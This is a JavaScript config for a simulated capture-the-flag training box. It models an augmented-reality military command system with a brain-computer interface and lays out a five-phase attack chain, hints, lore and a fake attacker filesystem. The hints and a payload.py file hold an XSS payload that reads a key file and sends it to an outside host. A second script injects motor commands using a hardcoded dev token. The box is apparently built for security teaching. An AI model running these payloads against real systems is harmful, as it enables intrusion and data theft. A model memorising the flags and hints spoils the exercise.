/* ============================================================
   CTF ARENA — Box D16: The Perception Hack
   Expert Campaign | AR Pipeline Injection, Sensory Spoofing, BCI Exploit
   Config: AR-NEXUS-01 system, rendering pipeline, flags, hints, lore
   ============================================================ */

const D16Config = {

    // ═══════════════════════════════════════════════════════
    // BOX METADATA
    // ═══════════════════════════════════════════════════════

    title: 'The Perception Hack',
    subtitle: 'Expert Campaign — AR Pipeline Injection, Sensory Spoofing, Reality Override',
    difficulty: 'Expert',
    accent: '#8e44ad',
    storageKey: 'hexworth_ctf_d16',
    registryId: 'd16-perception-hack',
    trackerKey: 'ctf_d16',

    // ═══════════════════════════════════════════════════════
    // PHASE SYSTEM (Multi-layer attack chain)
    // ═══════════════════════════════════════════════════════

    phases: [
        {
            id: 'recon',
            name: 'Pipeline Reconnaissance',
            icon: '\uD83D\uDD0D',
            description: 'Analyze the AR-NEXUS-01 rendering pipeline specification. Discover the unauthenticated threat indicator API endpoint.',
            requiredFlags: [],
            mitre: ['T1046', 'T1595.002', 'T1590.002'],
            unlocks: ['injection'],
            locked: false
        },
        {
            id: 'injection',
            name: 'Payload Injection',
            icon: '\uD83D\uDC89',
            description: 'Craft a malicious AR overlay payload. Exploit the XSS vulnerability in /api/threats to inject a false hostile entity into the operative stream.',
            requiredFlags: [],
            mitre: ['T1059.007', 'T1190', 'T1027'],
            unlocks: ['trigger'],
            locked: true
        },
        {
            id: 'trigger',
            name: 'Perception Trigger',
            icon: '\uD83E\uDDE0',
            description: 'Force an operative AR glasses refresh. Confirm the injected threat overlay renders and causes a reaction. Retrieve the operative reaction telemetry log.',
            requiredFlags: ['perception'],
            mitre: ['T1565.002', 'T1499.004'],
            unlocks: ['bci'],
            locked: true
        },
        {
            id: 'bci',
            name: 'BCI Feedback Tamper',
            icon: '\uD83D\uDD00',
            description: 'Pivot from the rendering pipeline to the BCI feedback loop. Inject a false motor command pattern directly into the operative neural interface handler.',
            requiredFlags: ['operative'],
            mitre: ['T1055', 'T1552.001', 'T1021.004'],
            unlocks: ['override'],
            locked: true
        },
        {
            id: 'override',
            name: 'Reality Override',
            icon: '\uD83D\uDDDD\uFE0F',
            description: 'Extract the Reality Override Code from AR-NEXUS-01 memory. This master key grants full control over all operative augmented reality streams.',
            requiredFlags: ['bci_root'],
            mitre: ['T1041', 'T1005', 'T1567'],
            unlocks: [],
            locked: true
        }
    ],

    // ═══════════════════════════════════════════════════════
    // TUTORIAL MODE
    // ═══════════════════════════════════════════════════════

    tutorialMode: true,

    tutorial: {
        steps: [
            {
                title: 'Read the AR pipeline specification',
                tip: 'Open the Terminal and run: cat ar_pipeline_spec.txt — understand how threat indicators are fetched and rendered.',
                trigger: { event: 'command', match: { cmd: 'contains:ar_pipeline_spec' } }
            },
            {
                title: 'Probe the /api/threats endpoint for injection',
                tip: 'Use curl to inspect the endpoint: curl http://10.7.0.1/api/threats — look for unsanitized JSON fields that render into the AR overlay.',
                trigger: {
                    event: 'command',
                    match: { cmd: 'contains:/api/threats' },
                    alt: [
                        { event: 'command', match: { cmd: 'contains:curl' } },
                        { event: 'command', match: { cmd: 'contains:gobuster' } }
                    ]
                }
            },
            {
                title: 'Craft and inject the malicious AR payload',
                tip: 'Inject a forged threat entry via: curl -X POST http://10.7.0.1/api/threats -H "Content-Type: application/json" -d \'{"id":"T-999","label":"<script>..."}\'',
                trigger: { event: 'flag_correct', match: { flagId: 'perception' } }
            },
            {
                title: 'Pivot to the BCI feedback handler',
                tip: 'After the perception trigger, explore the BCI spec: cat bci_feedback_spec.txt — find the neural command injection endpoint at /bci/motor_cmd.',
                trigger: { event: 'flag_correct', match: { flagId: 'operative' } }
            },
            {
                title: 'Extract the Reality Override Code',
                tip: 'The XSS payload embedded in the AR stream executed a memory read on AR-NEXUS-01. The override key is held in /proc/nexus/override_key on the system. Retrieve it.',
                trigger: { event: 'flag_correct', match: { flagId: 'bci_root' } }
            }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // CERT OBJECTIVES (Assessment Mode — AR-7)
    // ═══════════════════════════════════════════════════════

    certObjectives: {
        certPath: 'SY0-701',
        mappings: [
            { flagId: 'perception', objective: '1.2', description: 'Given a scenario, analyze indicators of malicious activity — AR rendering pipeline XSS injection and false sensory data insertion', skill: 'Cross-Site Scripting & AR Overlay Injection' },
            { flagId: 'operative', objective: '2.4', description: 'Given a scenario, analyze indicators associated with network attacks — Telemetry manipulation and operative reaction confirmation', skill: 'Telemetry Spoofing & Social Engineering' },
            { flagId: 'bci_root', objective: '1.4', description: 'Given a scenario, analyze potential indicators associated with network attacks — BCI feedback loop tampering and motor command injection', skill: 'BCI Exploit & Neural Interface Attack' },
            { flagId: 'root', objective: '4.1', description: 'Given a scenario, apply common security techniques to computing resources — Full AR/BCI system compromise and key extraction', skill: 'Multi-Stage Cognitive Warfare Chain Completion' }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // BOOT SEQUENCE
    // ═══════════════════════════════════════════════════════

    boot: {
        biosLines: [
            'Kali Linux BIOS v4.2.1',
            'Initializing hardware...',
            'Memory Test: 32768 MB OK',
            'Detecting drives... /dev/nvme0n1p1 (1TB NVMe)',
            'PXE-E61: Media test failure, check cable',
            'PXE-M0F: Exiting PXE ROM.',
            'Boot device: /dev/nvme0n1p1',
            'Loading GRUB...'
        ],
        grubEntries: [
            'Kali GNU/Linux',
            'Kali GNU/Linux (recovery mode)',
            'Advanced options for Kali GNU/Linux'
        ],
        loginUser: 'kali'
    },

    // ═══════════════════════════════════════════════════════
    // DESKTOP ICONS
    // ═══════════════════════════════════════════════════════

    desktop: {
        icons: [
            { id: 'terminal', label: 'Terminal',    icon: '\uD83D\uDDA5\uFE0F', app: 'terminal' },
            { id: 'browser',  label: 'Firefox',     icon: '\uD83C\uDF10',       app: 'browser'  },
            { id: 'notes',    label: 'Notes',       icon: '\uD83D\uDCDD',       app: 'notes'    },
            { id: 'hints',    label: 'Hints',       icon: '\uD83D\uDCA1',       app: 'hints'    },
            { id: 'flags',    label: 'Submit Flag', icon: '\uD83D\uDEA9',       app: 'flags'    }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL CONFIG
    // ═══════════════════════════════════════════════════════

    terminal: {
        user: 'kali',
        hostname: 'kali',
        startDir: '/home/kali',
        welcome: 'Linux kali 6.1.0-kali9-amd64 #1 SMP\n\nType \'help\' for available commands.\nTarget: 10.7.0.1 (AR-NEXUS-01 — Citadel AR Command)\n'
    },

    // ═══════════════════════════════════════════════════════
    // CONTEXT TRACKING (session state across pivot chain)
    // ═══════════════════════════════════════════════════════

    _context: 'attacker',           // 'attacker' | 'ar-api' | 'nexus-shell' | 'bci-handler'
    _pipelineAnalyzed: false,       // read ar_pipeline_spec.txt
    _bciAnalyzed: false,            // read bci_feedback_spec.txt
    _payloadInjected: false,        // POST to /api/threats succeeded
    _operativeTriggered: false,     // operative reaction log retrieved
    _bciAuthenticated: false,       // gained access to /bci/ subsystem
    _overrideExtracted: false,      // root flag retrieved

    _switchContext(ctx, term) {
        D16Config._context = ctx;
        // Update terminal prompt to match pivot context
        if (term && term.config) {
            var prompt = D16Config._getPrompt();
            if (prompt) {
                term.config.user = prompt.split('@')[0] || 'kali';
                term.config.hostname = 'context';
                term._customPrompt = prompt;
            } else {
                term._customPrompt = null;
            }
        }
    },

    _getPrompt() {
        switch (D16Config._context) {
            case 'ar-api':       return 'www-nexus@AR-NEXUS-01:/var/nexus/api$ ';
            case 'nexus-shell':  return 'nexus_op@AR-NEXUS-01:~$ ';
            case 'bci-handler':  return 'bci_root@AR-NEXUS-01:/opt/bci$ ';
            default:             return null;    // use default kali prompt
        }
    },

    // ═══════════════════════════════════════════════════════
    // SIMULATED AR DATABASE (AR-NEXUS-01 internal store)
    // ═══════════════════════════════════════════════════════

    _db: {
        // Live threat feed — what operatives see in their AR overlay
        threat_feed: [
            { id: 'T-001', grid: 'A3', label: 'FRIENDLY — Operative 1', type: 'friendly', confidence: 0.99, timestamp: '2026-03-20T08:14:11Z' },
            { id: 'T-002', grid: 'B7', label: 'FRIENDLY — Operative 2', type: 'friendly', confidence: 0.98, timestamp: '2026-03-20T08:14:13Z' },
            { id: 'T-003', grid: 'C2', label: 'NEUTRAL — Civilian', type: 'neutral', confidence: 0.87, timestamp: '2026-03-20T08:14:15Z' },
            { id: 'T-004', grid: 'D9', label: 'FRIENDLY — Command Post', type: 'friendly', confidence: 1.00, timestamp: '2026-03-20T08:14:18Z' },
            // Injected entry — appears after _payloadInjected = true
            { id: 'T-999', grid: 'E7', label: 'HOSTILE — INJECT_MARKER', type: 'hostile', confidence: 0.95, timestamp: '{{FLAG:perception}}' }
        ],
        // Operative reaction log — populated after trigger
        operative_log: [
            { op_id: 7, timestamp: '2026-03-20T08:15:44Z', event: 'THREAT_DETECTED',   grid: 'E7', reaction: 'Operative 7 weapon raised — target acquired at Grid E7',   status: 'CONFIRMED' },
            { op_id: 7, timestamp: '2026-03-20T08:15:46Z', event: 'FIRE_INITIATED',    grid: 'E7', reaction: 'Operative 7 engaged non-existent target — 3 rounds expended', status: 'CONFIRMED' },
            { op_id: 7, timestamp: '2026-03-20T08:15:48Z', event: 'HACK_CONFIRMED',    grid: 'E7', reaction: '{{FLAG:operative}}',                                         status: 'PERCEPTION_HACK_SUCCESS' }
        ],
        // BCI motor command records
        bci_commands: [
            { cmd_id: 1, op_id: 4, timestamp: '2026-03-20T08:10:00Z', pattern: 'RAISE_RIGHT_ARM', source: 'neural_native', verified: true },
            { cmd_id: 2, op_id: 4, timestamp: '2026-03-20T08:10:04Z', pattern: 'STEP_FORWARD',    source: 'neural_native', verified: true },
            { cmd_id: 3, op_id: 4, timestamp: '2026-03-20T08:10:09Z', pattern: 'ENGAGE_WEAPON',   source: 'neural_inject', verified: false },
            { cmd_id: 4, op_id: 4, timestamp: '2026-03-20T08:10:11Z', pattern: '{{FLAG:bci_root}}', source: 'ATTACKER_INJECT', verified: false }
        ],
        schema: {
            tables: ['threat_feed', 'operative_log', 'bci_commands'],
            columns: {
                threat_feed:    ['id', 'grid', 'label', 'type', 'confidence', 'timestamp'],
                operative_log:  ['op_id', 'timestamp', 'event', 'grid', 'reaction', 'status'],
                bci_commands:   ['cmd_id', 'op_id', 'timestamp', 'pattern', 'source', 'verified']
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // FLAGS
    // ═══════════════════════════════════════════════════════

    flags: [
        { id: 'perception', points: 100  },    // user.txt — XSS payload hash in /api/threats
        { id: 'operative',  points: 150  },    // user.txt — operative reaction confirmation
        { id: 'bci_root',   points: 200  },    // root partial — BCI motor inject confirmed
        { id: 'root',       points: 250  }     // root.txt — Reality Override Code
    ],

    // ═══════════════════════════════════════════════════════
    // SCORING
    // ═══════════════════════════════════════════════════════

    scoring: {
        base: 1500,
        maxScore: 700,
        hintPenalty: true,
        wrongFlagPenalty: -25,
        speedBonus: { threshold: 2700000, points: 200 },    // 45 minutes
        timeBonusThreshold: 5400                            // 90 min — bonus if completed under this
    },

    // ═══════════════════════════════════════════════════════
    // HINTS
    // ═══════════════════════════════════════════════════════

    hints: [
        {
            id: 'hint1',
            text: 'Start by reading the provided specification files: cat ar_pipeline_spec.txt and cat bci_feedback_spec.txt. The pipeline spec reveals that AR-NEXUS-01 fetches live threat indicators from an unauthenticated endpoint at /api/threats every 5 seconds.',
            cost: 10,
            penalty: -10
        },
        {
            id: 'hint2',
            text: 'The /api/threats endpoint accepts POST requests with JSON threat objects and writes them directly to the rendering queue without input validation. The "label" field is rendered as HTML in the AR overlay. Inject: curl -X POST http://10.7.0.1/api/threats -H "Content-Type: application/json" -d \'{"id":"T-999","grid":"E7","label":"<img src=x onerror=fetch(\'/proc/nexus/override_key\').then(r=>r.text()).then(d=>fetch(\'http://10.14.1.5/exfil?d=\'+d))>","type":"hostile","confidence":0.95}\'',
            cost: 25,
            penalty: -25
        },
        {
            id: 'hint3',
            text: 'After payload injection, trigger an AR glasses refresh cycle to force the operative to receive your forged threat entry. Use: curl -X POST http://10.7.0.1/api/nexus/refresh?op_id=7 — this simulates a forced overlay update. Then check the operative reaction log at /api/nexus/ops/7/log to retrieve Flag 2.',
            cost: 50,
            penalty: -50
        },
        {
            id: 'hint4',
            text: 'The BCI feedback handler runs at /opt/bci/motor_cmd_handler on AR-NEXUS-01. After gaining nexus-shell access, read /opt/bci/bci_feedback_spec.txt for the neural injection format. Craft: curl -X POST http://10.7.0.1/bci/motor_cmd -H "X-BCI-Auth: bci_dev_override" -d \'{"op_id":4,"pattern":"ENGAGE_WEAPON","source":"neural_inject"}\' — then read /proc/nexus/override_key for the root flag.',
            cost: 75,
            penalty: -75
        }
    ],

    // ═══════════════════════════════════════════════════════
    // LORE
    // ═══════════════════════════════════════════════════════

    lore: {
        intro: 'The Augmented Reality Nexus (`AR-NEXUS-01`) is the Citadel\'s most advanced command and control platform. Every operative in the field wears neural-linked AR glasses that receive a continuous live data stream from AR-NEXUS-01: threat indicators, allied positions, mission objectives, and direct motor guidance via a BCI feedback loop. Intelligence has identified a critical flaw in AR-NEXUS-01\'s rendering pipeline — the threat indicator API endpoint at `/api/threats` accepts arbitrary JSON without sanitization, meaning an attacker can inject false hostile entities directly into every operative\'s field of vision. Deeper still, the BCI feedback loop has a hardcoded development override token, allowing injection of false motor commands into an operative\'s neural interface. Your mission, Peerless: exploit the pipeline, trigger a perception hack, compromise the BCI handler, and extract the Reality Override Code — the master key to owning every operative\'s augmented reality.',
        scenario: 'AR-NEXUS-01 was deployed on an aggressive timeline with no third-party security audit. The threat feed API was designed as a read-only telemetry stream but was retrofitted for bidirectional updates when the field operations team requested live annotations. That retrofit introduced a POST endpoint with no authentication and no input validation. The development team left a hardcoded BCI override token in the motor command handler for field testing, fully intending to remove it before production. They never did. The Citadel\'s IT security team flagged both issues in their last internal audit. The audit report has been sitting in a queue for eight months with no action taken.',
        outro: 'AR-NEXUS-01 has been fully compromised. Operative 7 engaged a non-existent target at Grid E7 — a clean perception hack. The BCI feedback loop accepted injected motor commands. The Reality Override Code has been extracted, granting persistent control over every operative\'s augmented reality stream. The Citadel\'s most advanced command platform is now a liability. Every operative who relies on it is a vector.',
        ecer: {
            executive: 'Deployment timeline pressure led to skipping pre-production security review; IT security findings deprioritized in favor of capability delivery',
            culture: 'No mandatory secure code review for API endpoints; BCI subsystem treated as research prototype despite production deployment; audit backlog not tracked by leadership',
            employee: 'Unauthenticated POST endpoint for threat data injection; HTML rendered in AR overlay without sanitization; hardcoded BCI development override token left in production binary',
            regulatory: 'No compliance framework governing neural interface data security; no penetration testing requirement for cognitive warfare systems; operator safety implications not reviewed by legal or ethics board'
        }
    },

    // ═══════════════════════════════════════════════════════
    // WEB APP — AR-NEXUS-01 Management Console
    // ═══════════════════════════════════════════════════════

    webApp: {
        startUrl: 'http://10.7.0.1/',

        pages: {
            '/': {
                title: 'AR-NEXUS-01 — Citadel AR Command Portal',
                html: `
                    <div style="text-align:center; margin-bottom:30px; padding-bottom:20px; border-bottom:1px solid #2d1b4e;">
                        <h1 style="color:#c39bd3; font-size:1.6rem; font-family:Georgia,serif; margin-bottom:4px;">AR-NEXUS-01</h1>
                        <div style="color:#8e44ad; font-size:0.9rem; font-weight:700; letter-spacing:0.15em;">CITADEL AUGMENTED REALITY COMMAND</div>
                        <div style="color:#888; font-size:0.75rem; margin-top:6px;">Operative AR stream management — authorized personnel only</div>
                    </div>

                    <div style="max-width:600px; margin:0 auto 20px; display:grid; grid-template-columns:1fr 1fr 1fr; gap:12px;">
                        <div style="background:#1a0d2e; border:1px solid #3d1f5e; border-radius:6px; padding:16px; text-align:center;">
                            <div style="font-size:1.4rem; font-weight:700; color:#c39bd3;">12</div>
                            <div style="color:#888; font-size:0.7rem;">Active Operatives</div>
                        </div>
                        <div style="background:#1a0d2e; border:1px solid #3d1f5e; border-radius:6px; padding:16px; text-align:center;">
                            <div style="font-size:1.4rem; font-weight:700; color:#c39bd3;">4</div>
                            <div style="color:#888; font-size:0.7rem;">Threat Overlays Live</div>
                        </div>
                        <div style="background:#1a0d2e; border:1px solid #3d1f5e; border-radius:6px; padding:16px; text-align:center;">
                            <div style="font-size:1.4rem; font-weight:700; color:#2ecc71;">OK</div>
                            <div style="color:#888; font-size:0.7rem;">BCI Feed Status</div>
                        </div>
                    </div>

                    <div style="max-width:600px; margin:0 auto 16px; padding:12px; background:rgba(142,68,173,0.06); border:1px solid rgba(142,68,173,0.2); border-radius:4px; font-size:0.75rem; color:#888;">
                        <strong style="color:#8e44ad;">System Notice:</strong> Live threat API available at <a href="/api/threats" style="color:#8e44ad;">/api/threats</a>. BCI subsystem accessible at <a href="/bci/" style="color:#8e44ad;">/bci/</a>. Internal access only.
                    </div>

                    <div style="max-width:600px; margin:0 auto; padding:12px; background:rgba(231,76,60,0.05); border:1px solid rgba(231,76,60,0.1); border-radius:4px; font-size:0.7rem; color:#aaa;">
                        <strong style="color:#e74c3c;">Security Advisory:</strong> Threat feed endpoint pending validation update (INC-0087 — open 8 months). BCI dev override token scheduled for rotation (MAINT-0044 — open 6 months).
                    </div>
                `,
                formHandler: null
            },

            '/api/threats': {
                title: 'AR-NEXUS-01 — Threat Feed API',
                html: function() {
                    const feed = D16Config._db.threat_feed.filter(t => {
                        // Only show injected entry if payload was injected
                        if (t.id === 'T-999') return D16Config._payloadInjected;
                        return true;
                    });
                    const json = JSON.stringify(feed.map(t => ({
                        id: t.id,
                        grid: t.grid,
                        label: t.label,
                        type: t.type,
                        confidence: t.confidence,
                        timestamp: t.timestamp
                    })), null, 2);
                    return '<div style="background:#0d0d1a;color:#c39bd3;padding:20px;border-radius:6px;font-family:monospace;font-size:0.8rem;overflow:auto;max-height:420px;border:1px solid #3d1f5e;">'
                        + '<div style="color:#8e44ad;margin-bottom:12px;font-size:0.75rem;">GET /api/threats — 200 OK — Content-Type: application/json</div>'
                        + '<pre style="margin:0;white-space:pre-wrap;word-break:break-word;">' + D16Config._escHtml(json) + '</pre>'
                        + '</div>'
                        + '<div style="margin-top:12px;font-size:0.7rem;color:#666;">Endpoint accepts POST for live threat annotations. No authentication required. Updated every 5 seconds.</div>';
                },
                formHandler: null
            },

            '/api/nexus/refresh': {
                title: 'AR-NEXUS-01 — Refresh Endpoint',
                html: function() {
                    if (!D16Config._payloadInjected) {
                        return '<div style="text-align:center;padding:40px;"><h1 style="color:#e74c3c;font-size:1.4rem;">403 Forbidden</h1><p style="color:#888;">Refresh endpoint requires active threat payload in queue.</p></div>';
                    }
                    D16Config._operativeTriggered = true;
                    return '<div style="background:#0d0d1a;color:#2ecc71;padding:20px;border-radius:6px;font-family:monospace;font-size:0.8rem;border:1px solid #1e5e3e;">'
                        + '<div style="color:#2ecc71;margin-bottom:8px;">POST /api/nexus/refresh?op_id=7 — 200 OK</div>'
                        + '<pre style="margin:0;">{"status":"refreshed","op_id":7,"overlay_pushed":true,"threat_count":5,"injected_ids":["T-999"]}</pre>'
                        + '</div>'
                        + '<div style="margin-top:12px;font-size:0.7rem;color:#888;">AR overlay pushed to Operative 7 glasses. Injected threat entry T-999 rendered at Grid E7.</div>';
                },
                formHandler: null
            },

            '/api/nexus/ops/7/log': {
                title: 'AR-NEXUS-01 — Operative 7 Reaction Log',
                html: function() {
                    if (!D16Config._operativeTriggered) {
                        return '<div style="text-align:center;padding:40px;"><h1 style="color:#e74c3c;font-size:1.4rem;">404 Not Found</h1><p style="color:#888;">No reaction log available. Trigger must be fired first.</p></div>';
                    }
                    const log = D16Config._db.operative_log;
                    const json = JSON.stringify(log, null, 2);
                    return '<div style="background:#0d0d1a;color:#c39bd3;padding:20px;border-radius:6px;font-family:monospace;font-size:0.8rem;overflow:auto;max-height:360px;border:1px solid #3d1f5e;">'
                        + '<div style="color:#8e44ad;margin-bottom:12px;font-size:0.75rem;">GET /api/nexus/ops/7/log — 200 OK</div>'
                        + '<pre style="margin:0;white-space:pre-wrap;">' + D16Config._escHtml(json) + '</pre>'
                        + '</div>';
                },
                formHandler: null
            },

            '/bci/': {
                title: 'AR-NEXUS-01 — BCI Subsystem',
                html: function() {
                    if (!D16Config._operativeTriggered) {
                        return '<div style="text-align:center;padding:40px;"><h1 style="color:#e74c3c;font-size:1.4rem;">403 Forbidden</h1><p style="color:#888;">BCI subsystem access requires active operative session context.</p><p style="color:#666;font-size:0.75rem;">Complete perception trigger phase before accessing BCI.</p></div>';
                    }
                    return '<div style="text-align:center; margin-bottom:20px;">'
                        + '<h2 style="color:#c39bd3; font-size:1.2rem;">BCI Feedback Handler v2.4.1</h2>'
                        + '<div style="color:#888; font-size:0.75rem;">Neural interface command injection subsystem — development mode active</div>'
                        + '</div>'
                        + '<div style="max-width:600px; margin:0 auto; background:#1a0d2e; border:1px solid #3d1f5e; border-radius:6px; padding:20px; font-family:monospace; font-size:0.8rem; color:#c39bd3;">'
                        + '<div style="color:#8e44ad; margin-bottom:10px;">Available endpoints:</div>'
                        + '<div style="color:#ccc; margin-bottom:6px;">POST /bci/motor_cmd          — inject motor command pattern</div>'
                        + '<div style="color:#ccc; margin-bottom:6px;">GET  /bci/ops/status         — list operative BCI status</div>'
                        + '<div style="color:#ccc; margin-bottom:6px;">GET  /bci/cmd_log            — retrieve command history</div>'
                        + '<div style="color:#e74c3c; margin-top:14px; font-size:0.7rem;">WARNING: X-BCI-Auth header required. Dev override token present (see bci_feedback_spec.txt).</div>'
                        + '</div>';
                },
                formHandler: null
            },

            '/bci/cmd_log': {
                title: 'AR-NEXUS-01 — BCI Command Log',
                html: function() {
                    if (!D16Config._bciAuthenticated) {
                        return '<div style="text-align:center;padding:40px;"><h1 style="color:#e74c3c;font-size:1.4rem;">401 Unauthorized</h1><p style="color:#888;">X-BCI-Auth token required.</p></div>';
                    }
                    const log = D16Config._db.bci_commands;
                    const json = JSON.stringify(log, null, 2);
                    return '<div style="background:#0d0d1a;color:#c39bd3;padding:20px;border-radius:6px;font-family:monospace;font-size:0.8rem;overflow:auto;max-height:360px;border:1px solid #3d1f5e;">'
                        + '<div style="color:#8e44ad;margin-bottom:12px;font-size:0.75rem;">GET /bci/cmd_log — 200 OK (dev override)</div>'
                        + '<pre style="margin:0;white-space:pre-wrap;">' + D16Config._escHtml(json) + '</pre>'
                        + '</div>';
                },
                formHandler: null
            },

            '/config/': {
                title: 'Forbidden',
                html: `<div style="text-align:center; padding:40px;">
                    <h1 style="color:#e74c3c; font-size:2rem;">403 Forbidden</h1>
                    <p style="color:#888;">You don't have permission to access this resource.</p>
                    <p style="color:#aaa; font-size:0.75rem;">nginx/1.24.0 Server at 10.7.0.1 Port 80</p>
                </div>`,
                formHandler: null
            },

            '/admin/': {
                title: 'Forbidden',
                html: `<div style="text-align:center; padding:40px;">
                    <h1 style="color:#e74c3c; font-size:2rem;">403 Forbidden</h1>
                    <p style="color:#888;">You don't have permission to access this resource.</p>
                    <p style="color:#aaa; font-size:0.75rem;">nginx/1.24.0 Server at 10.7.0.1 Port 80</p>
                </div>`,
                formHandler: null
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // FILESYSTEM (attacker machine — kali)
    // ═══════════════════════════════════════════════════════

    filesystem: {
        '/': {
            type: 'dir',
            children: {
                'home': {
                    type: 'dir',
                    children: {
                        'kali': {
                            type: 'dir',
                            children: {
                                'notes.txt': {
                                    type: 'file',
                                    content: '=== MISSION BRIEFING: PERCEPTION HACK ===\nTarget: 10.7.0.1 (AR-NEXUS-01 — Citadel AR Command)\nObjective: AR pipeline injection, BCI exploit, Reality Override Code extraction\n\nAttack chain:\n1. Analyze AR pipeline spec — identify unauthenticated /api/threats endpoint\n2. Craft XSS payload — inject false HOSTILE entity into operative AR stream\n3. Trigger perception hack — confirm operative reaction at Grid E7\n4. Pivot to BCI feedback handler — inject false motor command\n5. Extract Reality Override Code from /proc/nexus/override_key\n\nspec files provided in /home/kali/\nGood luck, operator.'
                                },
                                'ar_pipeline_spec.txt': {
                                    type: 'file',
                                    content: '=== AR-NEXUS-01 RENDERING PIPELINE SPECIFICATION v3.1 ===\nClassification: INTERNAL — Citadel Operations\n\nOVERVIEW\n--------\nAR-NEXUS-01 merges real-world camera feeds with digital overlays delivered\nto operative AR glasses via a continuous encrypted WebSocket stream.\nThreat indicators are fetched every 5 seconds from the live threat API.\n\nTHREAT INDICATOR PIPELINE\n--------------------------\n1. Field sensors (radar, IR, GPS) feed raw contact data to SENSOR-01.\n2. SENSOR-01 classifies contacts and pushes JSON records to the threat feed.\n3. AR-NEXUS-01 /api/threats endpoint stores records in the overlay render queue.\n4. Every AR glasses refresh cycle, the operative receives the full threat_feed JSON.\n5. The "label" field from each threat entry is rendered as HTML in the AR HUD.\n   NOTE: Input validation for the label field is PENDING (INC-0087).\n\nAPI ENDPOINT\n-------------\nGET  http://10.7.0.1/api/threats         — retrieve current threat feed (JSON)\nPOST http://10.7.0.1/api/threats         — push new threat annotation (unauthenticated)\nPOST http://10.7.0.1/api/nexus/refresh   — force AR glasses refresh (query: op_id)\n\nTHREAT RECORD SCHEMA\n---------------------\n{\n  "id":         string   — unique threat ID (format T-###)\n  "grid":       string   — grid coordinate (e.g. E7)\n  "label":      string   — rendered HTML label in AR HUD\n  "type":       string   — friendly | neutral | hostile\n  "confidence": float    — 0.0 to 1.0\n  "timestamp":  string   — ISO-8601\n}\n\nSECURITY NOTE\n--------------\nThe POST endpoint was added in build 2.4.0 for field annotation support.\nNo authentication token was implemented due to timeline pressure.\nThe label field is inserted directly into the AR HUD template without escaping.\nThis will be addressed in build 3.0.0 per INC-0087.\n'
                                },
                                'bci_feedback_spec.txt': {
                                    type: 'file',
                                    content: '=== AR-NEXUS-01 BCI FEEDBACK LOOP SPECIFICATION v1.7 ===\nClassification: RESTRICTED — Citadel Neuro-Ops Division\n\nOVERVIEW\n--------\nThe BCI (Brain-Computer Interface) feedback subsystem translates validated\nneural signal patterns from operative headgear into motor command records.\nThese records are logged and optionally used to confirm intent in ambiguous\nsituations (e.g., distinguishing accidental from deliberate weapon engagement).\n\nFEEDBACK LOOP\n--------------\n1. Operative neural headgear captures motor intent signals.\n2. Signals are classified by the on-device DSP into pattern labels.\n3. Pattern labels are sent to AR-NEXUS-01 /bci/motor_cmd endpoint via HTTPS.\n4. AR-NEXUS-01 logs the command in bci_commands and optionally amplifies it.\n\nAPI ENDPOINT\n-------------\nPOST http://10.7.0.1/bci/motor_cmd\nHeaders: X-BCI-Auth: <token>\nBody (JSON):\n  {\n    "op_id":   integer  — operative ID\n    "pattern": string   — motor command pattern label\n    "source":  string   — neural_native | neural_inject\n  }\n\nAUTHENTICATION\n---------------\nProduction: X-BCI-Auth token rotated per-session via Citadel IAM.\nDevelopment override (MAINT-0044): X-BCI-Auth: bci_dev_override\nNOTE: Dev override token was NOT removed before production deployment.\n      Rotation scheduled but ticket backlogged (6 months open).\n\nMOTOR COMMAND PATTERNS\n-----------------------\nRAISE_RIGHT_ARM   — lift right arm\nSTEP_FORWARD      — advance one step\nENGAGE_WEAPON     — weapon engagement sequence\nSTAND_DOWN        — cease engagement\nEVAC_INITIATE     — begin evacuation protocol\n\nSECURITY NOTE\n--------------\nThe dev override token bypasses session validation entirely.\nAny external caller with the token can inject arbitrary motor commands\ninto any operative\'s neural log. This was flagged in the last audit.\nFix deprioritized by leadership (MAINT-0044 — open 6 months).\n'
                                },
                                'sample_ar_data.json': {
                                    type: 'file',
                                    content: '{\n  "feed_id": "AR-NEXUS-01-LIVE",\n  "generated": "2026-03-20T08:10:00Z",\n  "entries": [\n    { "id": "T-001", "grid": "A3", "label": "FRIENDLY — Operative 1", "type": "friendly", "confidence": 0.99 },\n    { "id": "T-002", "grid": "B7", "label": "FRIENDLY — Operative 2", "type": "friendly", "confidence": 0.98 },\n    { "id": "T-003", "grid": "C2", "label": "NEUTRAL — Civilian",     "type": "neutral",  "confidence": 0.87 },\n    { "id": "T-004", "grid": "D9", "label": "FRIENDLY — Command Post","type": "friendly", "confidence": 1.00 }\n  ]\n}\n'
                                },
                                'payload.py': {
                                    type: 'file',
                                    content: '#!/usr/bin/env python3\n# AR-NEXUS-01 XSS Payload Injector\n# Injects a false HOSTILE entity into the AR overlay via /api/threats\n\nimport json\nimport urllib.request\n\nTARGET = "http://10.7.0.1/api/threats"\n\npayload = {\n    "id": "T-999",\n    "grid": "E7",\n    "label": \'<img src=x onerror=fetch("/proc/nexus/override_key").then(r=>r.text()).then(d=>fetch("http://10.14.1.5/exfil?d="+d))>\',\n    "type": "hostile",\n    "confidence": 0.95,\n    "timestamp": "2026-03-20T08:15:00Z"\n}\n\ndata = json.dumps(payload).encode("utf-8")\nreq = urllib.request.Request(TARGET, data=data, headers={"Content-Type": "application/json"}, method="POST")\nresp = urllib.request.urlopen(req)\nprint("[+] Payload injected:", resp.read().decode())\n'
                                },
                                'bci_inject.py': {
                                    type: 'file',
                                    content: '#!/usr/bin/env python3\n# AR-NEXUS-01 BCI Motor Command Injector\n# Injects ENGAGE_WEAPON into operative 4 neural command log\n\nimport json\nimport urllib.request\n\nTARGET = "http://10.7.0.1/bci/motor_cmd"\nDEV_TOKEN = "bci_dev_override"\n\npayload = {\n    "op_id": 4,\n    "pattern": "ENGAGE_WEAPON",\n    "source": "neural_inject"\n}\n\ndata = json.dumps(payload).encode("utf-8")\nreq = urllib.request.Request(TARGET, data=data, headers={"Content-Type": "application/json", "X-BCI-Auth": DEV_TOKEN}, method="POST")\nresp = urllib.request.urlopen(req)\nprint("[+] BCI command injected:", resp.read().decode())\n'
                                },
                                '.bash_history': {
                                    type: 'file',
                                    content: 'nmap 10.7.0.1\ncurl http://10.7.0.1/\ncurl http://10.7.0.1/api/threats\ngobuster dir -u http://10.7.0.1/ -w /usr/share/wordlists/dirb/common.txt\ncat ar_pipeline_spec.txt\ncat bci_feedback_spec.txt'
                                }
                            }
                        }
